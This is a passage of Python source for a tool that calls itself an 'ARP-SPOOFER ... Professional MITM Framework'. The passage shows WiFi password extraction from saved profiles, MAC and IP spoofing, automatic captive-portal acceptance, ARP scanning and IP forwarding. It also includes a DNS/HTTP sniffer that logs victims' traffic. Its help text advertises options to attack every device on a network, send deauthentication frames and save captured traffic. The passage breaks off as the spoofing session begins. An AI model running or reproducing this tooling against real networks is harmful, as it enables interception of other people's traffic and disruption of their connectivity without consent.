            self.initial_ctx.wifi_auth = parse_netsh_field(out, "Authentication", "Authentification")

        if not self.initial_ctx.ssid:
            return
        password = self._get_wifi_password(self.initial_ctx.ssid)
        if password:
            self.initial_ctx.wifi_password = password
        self.ctx = NetworkContext(**self.initial_ctx.__dict__)
        log_info(f"WiFi profile saved: {self.initial_ctx.ssid}")

    def refresh_context(self) -> NetworkContext:
        with self._lock:
            ip, gateway, ip_range = self._detect_network()
            if ip: self.ctx.ip = ip
            if gateway: self.ctx.gateway = gateway
            if ip_range: self.ctx.ip_range = ip_range
            if self.ctx.gateway:
                self.ctx.gateway_mac = get_mac(self.ctx.gateway)
            return NetworkContext(**self.ctx.__dict__)

    def has_internet(self, use_cache: bool = True) -> bool:
        if use_cache:
            cached, ts = self._internet_cache
            if time.time() - ts < INTERNET_CACHE_TTL:
                return cached

        result = self._probe_internet()
        self._internet_cache = (result, time.time())
        return result

    def _probe_internet(self) -> bool:
        urls = [
            "http://connectivitycheck.gstatic.com/generate_204",
            "http://www.msftconnecttest.com/connecttest.txt",
            "http://captive.apple.com/hotspot-detect.html",
        ]
        for url in urls:
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=INTERNET_CHECK_TIMEOUT) as resp:
                    if resp.status == 204:
                        return True
                    if resp.status == 200:
                        body = resp.read(512).decode("utf-8", errors="ignore").lower()
                        if "success" in body or "microsoft connect test" in body:
                            return True
            except urllib.error.HTTPError as exc:
                if exc.code in (200, 204):
                    return True
            except Exception:
                continue

        probes = [("1.1.1.1", 443), ("8.8.8.8", 443), ("1.1.1.1", 53)]
        for host, port in probes:
            try:
                with socket.create_connection((host, port), timeout=INTERNET_CHECK_TIMEOUT):
                    return True
            except OSError:
                continue
        return False

    def needs_captive_portal(self) -> bool:
        try:
            req = urllib.request.Request(
                "http://neverssl.com/", headers={"User-Agent": "Mozilla/5.0"}
            )
            with urllib.request.urlopen(req, timeout=INTERNET_CHECK_TIMEOUT) as resp:
                final_url = resp.geturl().lower()
                html = resp.read(4096).decode("utf-8", errors="ignore").lower()
                if any(k in final_url for k in ("login", "portal", "hotspot", "wifi", "captive")):
                    return True
                if any(k in html for k in ("captive", "hotspot", "terms", "conditions", "accept")):
                    return True
        except Exception:
            pass
        return not self.has_internet()

    def handle_captive_portal(self) -> bool:
        log_info("Attempting captive portal acceptance...")
        test_urls = [
            "http://neverssl.com/",
            "http://connectivitycheck.gstatic.com/generate_204",
            "http://www.msftconnecttest.com/redirect",
            "http://captive.apple.com/hotspot-detect.html",
        ]
        for url in test_urls:
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=INTERNET_CHECK_TIMEOUT) as resp:
                    portal_url = resp.geturl()
                    html = resp.read(32768).decode("utf-8", errors="ignore")
                    if self._submit_captive_form(portal_url, html):
                        time.sleep(3)
                        if self.has_internet(use_cache=False):
                            log_ok("Captive portal accepted.")
                            return True
                    if self._click_captive_links(portal_url, html):
                        time.sleep(3)
                        if self.has_internet(use_cache=False):
                            log_ok("Captive portal accepted via link.")
                            return True
            except Exception:
                continue

        for url in test_urls:
            if self._try_common_captive_posts(url):
                time.sleep(3)
                if self.has_internet(use_cache=False):
                    log_ok("Captive portal accepted via fallback POST.")
                    return True
        log_warn("Could not auto-accept captive portal.")
        return False

    def recover_connectivity(self) -> bool:
        if self._recovery_in_progress:
            return False
        elapsed = time.time() - self._last_recovery
        if elapsed < RECOVERY_COOLDOWN:
            log_warn(f"Recovery cooldown ({int(RECOVERY_COOLDOWN - elapsed)}s remaining).")
            return False

        self._recovery_in_progress = True
        self._last_recovery = time.time()
        self._recovery_count += 1
        try:
            log_warn("Internet lost - starting recovery sequence...")
            methods = [
                self._method_dhcp_renew,
                self._method_change_local_ip,
                self._method_randomize_mac,
                self._method_adapter_reset,
                self._method_wifi_reconnect,
                self._method_wifi_scan_and_connect,
            ]
            for method in methods:
                log_info(f"Trying: {method.__name__}...")
                try:
                    if method():
                        self.refresh_context()
                        if self.needs_captive_portal():
                            self.handle_captive_portal()
                        if self.has_internet(use_cache=False):
                            log_ok(f"Connectivity restored via {method.__name__}.")
                            return True
                        if self._local_network_ok():
                            log_ok(f"Local network restored via {method.__name__}.")
                            return True
                except Exception as exc:
                    log_warn(f"{method.__name__} failed: {exc}")
                time.sleep(2)
            log_err("All recovery methods exhausted.")
            return False
        finally:
            self._recovery_in_progress = False
            self._internet_cache = (False, 0.0)

    def display_wifi_scan(self) -> List[WifiNetwork]:
        log_info("Scanning nearby WiFi networks (live radio scan)...")
        networks = self.scan_wifi_networks()
        if not networks:
            log_warn("No nearby WiFi networks detected.")
            log_warn("Run as Administrator and ensure your WiFi adapter is enabled.")
            return []
        seen = set()
        unique = []
        for n in networks:
            key = (n.ssid, n.bssid)
            if key not in seen:
                seen.add(key)
                unique.append(n)
        unique.sort(key=lambda n: n.signal, reverse=True)

        safe_print(f"\n{Fore.WHITE}+{'-' * 22}+{'-' * 20}+{'-' * 10}+{'-' * 28}+")
        safe_print(f"{Fore.WHITE}| {'SSID':<20} | {'BSSID':<18} | {'Signal':<8} | {'Auth':<26} |")
        safe_print(f"{Fore.WHITE}+{'-' * 22}+{'-' * 20}+{'-' * 10}+{'-' * 28}+")
        for n in unique:
            auth = n.auth[:26]
            sig = f"{n.signal}%" if n.signal else "N/A"
            open_tag = f"{Fore.GREEN}OPEN" if n.open_network else f"{Fore.YELLOW}SECURED"
            safe_print(
                f"{Fore.WHITE}| {Fore.CYAN}{n.ssid[:20]:<20} {Fore.WHITE}| "
                f"{Fore.LIGHTBLACK_EX}{n.bssid[:18]:<18} {Fore.WHITE}| "
                f"{Fore.GREEN}{sig:<8} {Fore.WHITE}| "
                f"{open_tag} {auth[:18]:<18} {Fore.WHITE}|"
            )
        safe_print(f"{Fore.WHITE}+{'-' * 22}+{'-' * 20}+{'-' * 10}+{'-' * 28}+")
        log_ok(f"Nearby WiFi scan: {len(unique)} network(s) found.")
        return unique

    def scan_wifi_networks(self) -> List[WifiNetwork]:
        if os.name != "nt":
            return []
        networks = NativeWifiScanner.scan()
        if networks:
            return networks
        iface = self._get_wifi_interface_name()
        if iface:
            _, out = run_netsh(f'netsh wlan show networks mode=bssid interface="{iface}"')
        else:
            _, out = run_netsh("netsh wlan show networks mode=bssid")
        if out.strip() and not self._is_location_blocked(out):
            networks = self._parse_wifi_scan(out)
            if networks:
                return networks
        if not out.strip() or self._is_location_blocked(out):
            self._warn_location_required()
        return []

    def _is_location_blocked(self, text: str) -> bool:
        if not text:
            return False
        markers = (
            "location permission", "location services", "wlanqueryinterface",
            "network commands need location", "desktop apps access your location",
            "location access",
        )
        low = text.lower()
        if any(m in low for m in markers):
            return True
        return "location" in low and ("permission" in low or "services" in low or "access" in low)

    def _warn_location_required(self):
        log_warn("Live WiFi scan returned no results.")
        log_warn(
            "If needed, enable: Settings > Privacy > Location > "
            "'Let desktop apps access your location'"
        )

    def _get_wifi_interface_name(self) -> str:
        ok, out = run_netsh("netsh wlan show interfaces")
        if ok and out.strip():
            name = parse_netsh_field(out, "Name", "Nom")
            if name:
                return name
        return self.ctx.interface_name or self._get_active_interface()

    def _method_randomize_mac(self) -> bool:
        if os.name != "nt":
            return False
        iface = self.ctx.interface_name or self._get_active_interface()
        if not iface:
            return False
        return apply_spoofed_mac(iface)

    def _method_dhcp_renew(self) -> bool:
        iface = self.ctx.interface_name or self._get_active_interface()
        if os.name == "nt":
            if iface:
                run_cmd(f'netsh interface ip set address name="{iface}" source=dhcp')
            run_cmd("ipconfig /release")
            time.sleep(1)
            run_cmd("ipconfig /renew")
            run_cmd("ipconfig /flushdns")
        else:
            run_cmd("sudo dhclient -r")
            run_cmd("sudo dhclient")
        return self.has_internet()

    def _method_change_local_ip(self) -> bool:
        if not self.ctx.ip or not self.ctx.gateway:
            self.refresh_context()
        if not self.ctx.ip or not self.ctx.gateway:
            return False
        parts = self.ctx.ip.split(".")
        if len(parts) != 4:
            return False
        subnet = ".".join(parts[:3])
        new_host = random.randint(2, 254)
        while f"{subnet}.{new_host}" == self.ctx.ip:
            new_host = random.randint(2, 254)
        new_ip = f"{subnet}.{new_host}"
        iface = self.ctx.interface_name or self._get_active_interface()
        if not iface:
            return False
        mask = "255.255.255.0"
        gateway = self.ctx.gateway
        ok, _ = run_cmd(
            f'netsh interface ip set address name="{iface}" static {new_ip} {mask} {gateway}'
        )
        if ok:
            log_ok(f"Local IP changed to {new_ip}")
            self.ctx.ip = new_ip
            self.ctx.ip_range = f"{subnet}.0/24"
            time.sleep(2)
            return self.has_internet()
        return False

    def _method_adapter_reset(self) -> bool:
        iface = self.ctx.interface_name or self._get_active_interface()
        if not iface or os.name != "nt":
            return False
        run_cmd(f'netsh interface set interface name="{iface}" admin=disable')
        time.sleep(3)
        run_cmd(f'netsh interface set interface name="{iface}" admin=enable')
        time.sleep(5)
        self._method_dhcp_renew()
        return self.has_internet()

    def _method_wifi_reconnect(self) -> bool:
        if not self.initial_ctx.is_wifi or not self.initial_ctx.ssid:
            return False
        return self._connect_wifi(
            self.initial_ctx.ssid, self.initial_ctx.wifi_password, self.initial_ctx.wifi_auth
        )

    def _method_wifi_scan_and_connect(self) -> bool:
        networks = self.scan_wifi_networks()
        if not networks:
            log_warn("No WiFi networks found during scan.")
            return False
        candidates = self._rank_wifi_candidates(networks)
        for net in candidates[:8]:
            password = "" if not net.open_network else self.initial_ctx.wifi_password
            log_info(f"Trying WiFi: {net.ssid} ({net.auth}, signal {net.signal}%)")
            if self._connect_wifi(net.ssid, password, net.auth):
                time.sleep(4)
                if self.needs_captive_portal():
                    self.handle_captive_portal()
                if self.has_internet() or self._local_network_ok():
                    return True
        return False

    def _rank_wifi_candidates(self, networks: List[WifiNetwork]) -> List[WifiNetwork]:
        initial_ssid = self.initial_ctx.ssid.lower()
        initial_bssid_prefix = ""
        if self.initial_ctx.is_wifi:
            ok, out = run_netsh("netsh wlan show interfaces")
            bssid = parse_netsh_field(out, "BSSID")
            if bssid:
                initial_bssid_prefix = bssid[:8].lower()

        def score(net: WifiNetwork) -> tuple:
            ssid_low = net.ssid.lower()
            same_ssid = ssid_low == initial_ssid
            similar_ssid = initial_ssid and (initial_ssid in ssid_low or ssid_low in initial_ssid)
            same_oui = initial_bssid_prefix and net.bssid[:8].lower() == initial_bssid_prefix
            open_bonus = 1 if net.open_network else 0
            return (1 if same_ssid else 0, 1 if similar_ssid else 0, 1 if same_oui else 0, open_bonus, net.signal)

        return sorted(networks, key=score, reverse=True)

    def _connect_wifi(self, ssid: str, password: str, auth: str = "") -> bool:
        if os.name != "nt" or not ssid:
            return False
        self._ensure_wifi_profile(ssid, password, auth)
        ok, out = run_cmd(f'netsh wlan connect name="{ssid}" ssid="{ssid}"')
        out_low = out.lower()
        success_markers = ("success", "successfully", "connected", "complete", "connect")
        if ok or any(marker in out_low for marker in success_markers):
            time.sleep(4)
            return True
        return False

    def _ensure_wifi_profile(self, ssid: str, password: str, auth: str):
        ok, out = run_cmd(f'netsh wlan show profile name="{ssid}"')
        if ok and "does not exist" not in out.lower():
            if password:
                run_cmd(f'netsh wlan set profileparameter name="{ssid}" keyMaterial="{password}"')
            return
        profile_xml = self._build_wifi_profile_xml(ssid, password, auth)
        with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False, encoding="utf-8") as tmp:
            tmp.write(profile_xml)
            tmp_path = tmp.name
        try:
            run_cmd(f'netsh wlan add profile filename="{tmp_path}"')
        finally:
            try:
                os.remove(tmp_path)
            except OSError:
                pass

    def _build_wifi_profile_xml(self, ssid: str, password: str, auth: str) -> str:
        ssid = xml_escape.escape(ssid)
        password = xml_escape.escape(password)
        auth_low = (auth or "").lower()
        is_open = "open" in auth_low or not password
        if is_open:
            auth_type, enc_type = "open", "none"
        elif "wpa3" in auth_low:
            auth_type, enc_type = "WPA3SAE", "AES"
        elif "wpa2" in auth_low or "wpa2-personal" in auth_low:
            auth_type, enc_type = "WPA2PSK", "AES"
        elif "wpa" in auth_low:
            auth_type, enc_type = "WPAPSK", "TKIP"
        else:
            auth_type, enc_type = "WPA2PSK", "AES"

        if is_open:
            security = f"""
            <security>
                <authEncryption>
                    <authentication>{auth_type}</authentication>
                    <encryption>{enc_type}</encryption>
                    <useOneX>false</useOneX>
                </authEncryption>
            </security>"""
        else:
            security = f"""
            <security>
                <authEncryption>
                    <authentication>{auth_type}</authentication>
                    <encryption>{enc_type}</encryption>
                    <useOneX>false</useOneX>
                </authEncryption>
                <sharedKey>
                    <keyType>passPhrase</keyType>
                    <protected>false</protected>
                    <keyMaterial>{password}</keyMaterial>
                </sharedKey>
            </security>"""
        return f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>{security}
    </MSM>
</WLANProfile>"""

    def _submit_captive_form(self, page_url: str, html: str) -> bool:
        forms = re.findall(r"<form[^>]*>(.*?)</form>", html, re.I | re.S)
        for form_body in forms:
            action_m = re.search(r'action=["\']([^"\']*)["\']', form_body, re.I)
            action = action_m.group(1) if action_m else page_url
            if action.startswith("/"):
                parsed = urllib.parse.urlparse(page_url)
                action = f"{parsed.scheme}://{parsed.netloc}{action}"
            elif not action.startswith("http"):
                action = page_url

            fields = {}
            for inp in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>', form_body, re.I):
                tag = inp.group(0)
                name = inp.group(1)
                val_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
                input_type_m = re.search(r'type=["\']([^"\']*)["\']', tag, re.I)
                input_type = (input_type_m.group(1) if input_type_m else "").lower()
                if input_type in ("submit", "button", "image"):
                    val = val_m.group(1) if val_m else "1"
                    if any(k in (name + val).lower() for k in self.CAPTIVE_KEYWORDS):
                        fields[name] = val
                elif input_type not in ("password", "email", "text") or not val_m:
                    fields[name] = val_m.group(1) if val_m else ""

            if not fields:
                for inp in re.finditer(r'<input[^>]+type=["\'](?:submit|button)["\'][^>]*>', form_body, re.I):
                    tag = inp.group(0)
                    name_m = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
                    val_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
                    if name_m:
                        fields[name_m.group(1)] = val_m.group(1) if val_m else "1"
                        break

            if fields:
                data = urllib.parse.urlencode(fields).encode("utf-8")
                req = urllib.request.Request(action, data=data, headers={"User-Agent": "Mozilla/5.0"}, method="POST")
                try:
                    urllib.request.urlopen(req, timeout=INTERNET_CHECK_TIMEOUT)
                    return True
                except Exception:
                    continue
        return False

    def _click_captive_links(self, page_url: str, html: str) -> bool:
        parsed_base = urllib.parse.urlparse(page_url)
        base = f"{parsed_base.scheme}://{parsed_base.netloc}"
        patterns = [r'<a[^>]+href=["\']([^"\']+)["\'][^>]*>([^<]*)</a>', r'<button[^>]*>([^<]*)</button>']
        for pattern in patterns:
            for match in re.finditer(pattern, html, re.I | re.S):
                if pattern.startswith("<a"):
                    href, text = match.group(1), match.group(2)
                    combined = (href + " " + text).lower()
                    if not any(k in combined for k in self.CAPTIVE_KEYWORDS):
                        continue
                    if href.startswith("/"):
                        href = base + href
                    elif not href.startswith("http"):
                        href = urllib.parse.urljoin(page_url, href)
                    try:
                        req = urllib.request.Request(href, headers={"User-Agent": "Mozilla/5.0"})
                        urllib.request.urlopen(req, timeout=INTERNET_CHECK_TIMEOUT)
                        return True
                    except Exception:
                        continue
                else:
                    text = match.group(1).lower()
                    if any(k in text for k in self.CAPTIVE_KEYWORDS):
                        try:
                            req = urllib.request.Request(page_url, headers={"User-Agent": "Mozilla/5.0"})
                            urllib.request.urlopen(req, timeout=INTERNET_CHECK_TIMEOUT)
                            return True
                        except Exception:
                            continue
        return False

    def _try_common_captive_posts(self, base_url: str) -> bool:
        parsed = urllib.parse.urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        paths = ["/", "/login", "/portal", "/accept", "/connect", "/terms"]
        payloads = [{"accept": "1", "terms": "accepted"}, {"action": "accept"}, {"connect": "Connect"}]
        for path in paths:
            for payload in payloads:
                try:
                    data = urllib.parse.urlencode(payload).encode("utf-8")
                    req = urllib.request.Request(base + path, data=data, headers={"User-Agent": "Mozilla/5.0"}, method="POST")
                    urllib.request.urlopen(req, timeout=INTERNET_CHECK_TIMEOUT)
                    return True
                except Exception:
                    continue
        return False

    def _local_network_ok(self) -> bool:
        self.refresh_context()
        return bool(self.ctx.gateway and self.ctx.gateway_mac)

    def _detect_network(self, interface_name: str = "") -> Tuple[str, str, str]:
        iface = interface_name or self.ctx.interface_name
        ip_address = ""
        gateway = ""

        if os.name == "nt" and iface:
            ip_address = powershell_value(
                f"$a = Get-NetIPAddress -InterfaceAlias '{iface}' -AddressFamily IPv4 "
                f"-ErrorAction SilentlyContinue | "
                f"Where-Object {{ $_.IPAddress -notlike '169.254.*' }} | "
                f"Select-Object -First 1; if ($a) {{ $a.IPAddress }}"
            )
            gateway = powershell_value(
                f"(Get-NetRoute -InterfaceAlias '{iface}' -DestinationPrefix '0.0.0.0/0' "
                f"-ErrorAction SilentlyContinue | Sort-Object RouteMetric | "
                f"Select-Object -First 1).NextHop"
            )
            prefix = powershell_value(
                f"$a = Get-NetIPAddress -InterfaceAlias '{iface}' -AddressFamily IPv4 "
                f"-ErrorAction SilentlyContinue | "
                f"Where-Object {{ $_.IPAddress -notlike '169.254.*' }} | "
                f"Select-Object -First 1; if ($a) {{ $a.PrefixLength }}"
            )
            if ip_address and RE_IPV4.match(ip_address):
                try:
                    pfx = int(prefix) if prefix.isdigit() else 24
                    ip_range = str(ipaddress.ip_interface(f"{ip_address}/{pfx}").network)
                    return ip_address, gateway, ip_range
                except ValueError:
                    pass

        if not ip_address:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(("8.8.8.8", 80))
                ip_address = s.getsockname()[0]
            except OSError:
                ip_address = ""
            finally:
                s.close()

        if os.name == "nt" and not gateway:
            gateway = powershell_value(
                "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | "
                "Where-Object { $_.NextHop -ne '0.0.0.0' } | "
                "Sort-Object RouteMetric | Select-Object -First 1).NextHop"
            )
            if not gateway or not RE_IPV4.match(gateway):
                ok, output = run_cmd("route print 0.0.0.0")
                if ok:
                    for line in output.splitlines():
                        parts = line.split()
                        if len(parts) >= 3 and parts[0] == "0.0.0.0" and parts[1] == "0.0.0.0":
                            if RE_IPV4.match(parts[2]):
                                gateway = parts[2]
                                break
        elif not gateway:
            ok, output = run_cmd("ip route | grep default")
            if ok:
                match = re.search(r"via\s+(\d+\.\d+\.\d+\.\d+)", output)
                if match:
                    gateway = match.group(1)

        ip_range = ""
        if ip_address and ip_address != "127.0.0.1":
            ip_range = ".".join(ip_address.split(".")[:-1]) + ".0/24"
        return ip_address, gateway, ip_range

    def _get_active_interface(self) -> str:
        if self.ctx.interface_name:
            return self.ctx.interface_name
        if os.name != "nt":
            return ""
        ok, out = run_cmd(
            'powershell -NoProfile -Command '
            '"(Get-NetRoute -DestinationPrefix \'0.0.0.0/0\' | Sort-Object RouteMetric | '
            'Select-Object -First 1).InterfaceAlias"'
        )
        if ok and out.strip():
            return out.strip()
        ok, out = run_cmd("netsh wlan show interfaces")
        if ok:
            name = self._parse_value(out, "Name")
            if name:
                return name
        ok, out = run_cmd("netsh interface show interface")
        if ok:
            for line in out.splitlines():
                if "Connected" in line:
                    idx = line.find("Dedicated")
                    if idx != -1:
                        return line[idx:].split(None, 1)[-1].strip()
        return ""

    def _get_wifi_password(self, ssid: str) -> str:
        ok, out = run_cmd(f'netsh wlan show profile name="{ssid}" key=clear')
        if not ok:
            return ""
        match = re.search(r"(?:Key Content|Contenu de la cl[eé])\s*:\s*(.+)", out, re.I)
        return match.group(1).strip() if match else ""

    def _parse_value(self, text: str, key: str) -> str:
        return parse_netsh_field(text, key)

    def _parse_wifi_scan(self, output: str) -> List[WifiNetwork]:
        networks = []
        current_ssid = ""
        current_auth = ""
        current_signal = 0
        for line in output.splitlines():
            ssid_m = re.search(r"SSID\s+\d+\s*:\s*(.+)", line, re.I)
            if ssid_m:
                current_ssid = ssid_m.group(1).strip().strip('"')
                continue
            auth_m = re.search(r"(?:Authentication|Authentification)\s*:\s*(.+)", line, re.I)
            if auth_m:
                current_auth = auth_m.group(1).strip()
                continue
            sig_m = re.search(r"Signal\s*:\s*(\d+)\s*%", line, re.I)
            if sig_m:
                current_signal = int(sig_m.group(1))
                continue
            bssid_m = re.search(r"BSSID\s+\d+\s*:\s*([0-9a-f:]+)", line, re.I)
            if bssid_m and current_ssid:
                networks.append(
                    WifiNetwork(
                        ssid=current_ssid,
                        bssid=bssid_m.group(1).lower(),
                        signal=current_signal,
                        auth=current_auth,
                        open_network="ouvert" in current_auth.lower() or "open" in current_auth.lower(),
                    )
                )
        return networks

def get_arguments():
    parser = argparse.ArgumentParser(
        description=f"{Fore.LIGHTMAGENTA_EX}ARP-SPOOFER By LTX & Moka: Professional MITM Framework.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Fore.LIGHTCYAN_EX}EXAMPLES:
  {Fore.WHITE}python arp_spoofer.py --scan
  {Fore.WHITE}python arp_spoofer.py --scan -o devices.json
  {Fore.WHITE}python arp_spoofer.py --scan-wifi
  {Fore.WHITE}python arp_spoofer.py --scan-wifi -o wifi.json
  {Fore.WHITE}python arp_spoofer.py -a -s --pcap capture.pcap
  {Fore.WHITE}python arp_spoofer.py -a --whitelist 192.168.1.5,192.168.1.10
  {Fore.WHITE}python arp_spoofer.py -a --spoof-mac
  {Fore.WHITE}python arp_spoofer.py -a --deauth 192.168.1.50
  {Fore.WHITE}python arp_spoofer.py -t 192.168.1.50 -s
  {Fore.WHITE}python arp_spoofer.py --manual -r 192.168.1.0/24 -g 192.168.1.1 -i

{Fore.LIGHTMAGENTA_EX}NOTES:
  - Use --scan to list devices on the current network and exit.
  - Use --scan-wifi to list available WiFi networks and exit.
  - Use -o/--output to export scan results (.json or .csv) for --scan and --scan-wifi.
  - Use -a to attack everyone on the network automatically.
  - Use -t to target a specific IP without interactive prompt.
  - Use -s to enable the live DNS/HTTP traffic sniffer.
  - Use --pcap to save all sniffed traffic to a file for offline analysis.
  - Use --whitelist to exclude specific IPs from auto-targeting.
  - Use --spoof-mac to randomize your MAC address before attack.
  - Use --deauth to continuously send 802.11 deauth frames to a target IP.
  - Use --interval to control spoofing speed (default: 2.0s).
  - Use -i to list and select a network adapter (WiFi / Ethernet).
  - Use --manual to disable auto-detect (requires -r and -g).
  - Auto-detects gateway/range from the selected or best adapter (Windows).
  - Auto-recovery: DHCP, IP change, MAC rotate, WiFi reconnect, captive portal.
  - Automatically requests administrator elevation via UAC on Windows.
        """,
    )
    parser.add_argument("--scan", action="store_true", help="Scan devices on the network and exit (standalone mode)")
    parser.add_argument("--scan-wifi", action="store_true", help="Scan available WiFi networks and exit (Windows)")
    parser.add_argument("-o", "--output", dest="output", help="Export scan results to file (.json or .csv)")
    parser.add_argument("--log", dest="log_file", help="Write session events to a log file")
    parser.add_argument("-r", "--range", dest="ip_range", help="Network range (e.g. 192.168.1.0/24)")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP address")
    parser.add_argument("-a", "--all", action="store_true", help="Auto-target everyone (silent scan)")
    parser.add_argument("-t", "--target", dest="target", help="Target a specific IP directly")
    parser.add_argument("-s", "--sniff", action="store_true", help="Enable live traffic sniffing (DNS/HTTP)")
    parser.add_argument("--pcap", dest="pcap", help="Save sniffed traffic to a PCAP file")
    parser.add_argument("--whitelist", dest="whitelist", default="", help="Comma-separated IPs to exclude from auto-attack")
    parser.add_argument("--spoof-mac", action="store_true", help="Randomize MAC address before starting")
    parser.add_argument("--deauth", dest="deauth", metavar="IP", help="Send 802.11 deauth frames to a specific IP")
    parser.add_argument("--interval", type=float, default=2.0, help="Spoofing interval in seconds (default: 2.0)")
    parser.add_argument("-i", "--interface", nargs="?", const="__interactive__", default=None, metavar="N", help="List network adapters and select one (optional index, e.g. -i 2)")
    parser.add_argument("--manual", action="store_true", help="Manual mode: no auto-detect, requires -r and -g")
    parser.add_argument("--no-recovery", action="store_true", help="Disable automatic internet/WiFi recovery")
    parser.add_argument("--no-elevate", action="store_true", help="Skip automatic UAC administrator elevation (Windows)")
    return parser.parse_args()

def get_mac(ip, retries=2):
    for _ in range(retries):
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, retry=1)[0]
            if answered_list:
                return answered_list[0][1].hwsrc
        except Exception:
            time.sleep(0.5)
    return None

def get_local_ip() -> str:
    try:
        if conf.iface:
            return scapy.get_if_addr(conf.iface)
    except Exception:
        pass
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except OSError:
        return ""

def silent_scan(ip_range):
    answered_list = scapy.srp(
        scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip_range),
        timeout=2,
        verbose=False
    )[0]
    return [{"ip": element[1].psrc, "mac": element[1].hwsrc} for element in answered_list]

def visual_scan(ip_range):
    log_info(f"Initializing Network Scan on {ip_range}...")
    answered_list = scapy.srp(
        scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip_range),
        timeout=3,
        verbose=False
    )[0]
    clients = []

    safe_print(f"\n{Fore.WHITE}+{'-' * 17}+{'-' * 22}+{'-' * 25}+")
    safe_print(f"{Fore.WHITE}| {'IP Address':<15} | {'MAC Address':<20} | {'Device Name':<23} |")
    safe_print(f"{Fore.WHITE}+{'-' * 17}+{'-' * 22}+{'-' * 25}+")

    for element in answered_list:
        ip = element[1].psrc
        mac = element[1].hwsrc
        try:
            name = socket.gethostbyaddr(ip)[0][:23]
        except Exception:
            name = "Unknown Device"
        clients.append({"ip": ip, "mac": mac, "name": name})
        safe_print(
            f"{Fore.WHITE}| {Fore.GREEN}{ip:<15} {Fore.WHITE}| "
            f"{Fore.LIGHTBLACK_EX}{mac:<20} {Fore.WHITE}| "
            f"{Fore.MAGENTA}{name:<23} {Fore.WHITE}|"
        )

    safe_print(f"{Fore.WHITE}+{'-' * 17}+{'-' * 22}+{'-' * 25}+")
    log_ok(f"Found {len(clients)} device(s).")
    return clients

def enable_ip_forwarding():
    if os.name == "nt":
        run_cmd("netsh interface ipv4 set global forwarding=enabled")
        run_cmd(
            r'reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" '
            r"/v IPEnableRouter /t REG_DWORD /d 1 /f"
        )
    else:
        run_cmd("echo 1 > /proc/sys/net/ipv4/ip_forward")

def restore(destination_ip, destination_mac, source_ip, source_mac):
    if not destination_mac or not source_mac:
        return
    packet = scapy.Ether(dst=destination_mac) / scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    scapy.sendp(packet, count=4, verbose=False)

def _decode_http_field(value) -> str:
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="replace")
    return str(value)

def _normalize_dns_name(qname) -> str:
    if qname is None:
        return ""
    if isinstance(qname, bytes):
        text = qname.decode("utf-8", errors="ignore")
    else:
        text = str(qname)
    text = text.replace("\x00", "").strip().strip(".")
    text = "".join(ch for ch in text if ch.isprintable() and ch not in "\r\n\t")
    return text

def _extract_dns_queries(packet) -> List[str]:
    if not packet.haslayer(scapy.DNS):
        return []
    dns = packet[scapy.DNS]
    if dns.qr != 0 or dns.qd is None:
        return []

    qd = dns.qd
    records = qd if isinstance(qd, list) else [qd]
    names = []
    for record in records:
        if record is None:
            continue
        name = _normalize_dns_name(getattr(record, "qname", b""))
        if not name:
            continue
        if name in {".", "local"}:
            continue
        names.append(name)
    return names

def process_packet(packet):
    try:
        for name in _extract_dns_queries(packet):
            safe_print(f"\033[K\n{Fore.LIGHTMAGENTA_EX}[DNS LOG] {Fore.WHITE}{name}")
        if packet.haslayer(http.HTTPRequest):
            host = _decode_http_field(packet[http.HTTPRequest].Host)
            path = _decode_http_field(packet[http.HTTPRequest].Path) or "/"
            if host:
                safe_print(f"\033[K\n{Fore.GREEN}[WEB LOG] {Fore.WHITE}{host}{path}")
    except Exception:
        pass

class SpoofSession:
    def __init__(self, args, resilience: NetworkResilience):
        self.args = args
        self.resilience = resilience
        self.targets: List[dict] = []
        self.gateway_mac: Optional[str] = None
        self.gateway = args.gateway
        self.ip_range = args.ip_range
        self.whitelist = set(ip.strip() for ip in args.whitelist.split(",") if ip.strip())
        self._stop = threading.Event()
        self._targets_lock = threading.Lock()
        self.sent = 0
        self.last_target_refresh = 0.0
        self.last_mac_refresh = 0.0
        self.consecutive_gateway_failures = 0
        self.start_time = time.time()
        self._target_failures: Dict[str, int] = {}
        self.sock = None
        self._packet_cache = []
        self._cache_dirty = True
        try:
            self.local_mac = scapy.get_if_hwaddr(conf.iface)
        except Exception:
            self.local_mac = "00:00:00:00:00:00"

    def _is_excluded_ip(self, ip: str, local_ip: str) -> bool:
        if not ip or ip == self.gateway or ip == local_ip:
            return True
        if ip in self.whitelist:
            return True
        try:
            net = ipaddress.ip_network(self.ip_range, strict=False)
            if ip == str(net.network_address) or ip == str(net.broadcast_address):
                return True
        except ValueError:
            pass
        return False

    def setup_targets(self):
        local_ip = get_local_ip()
        if self.args.target:
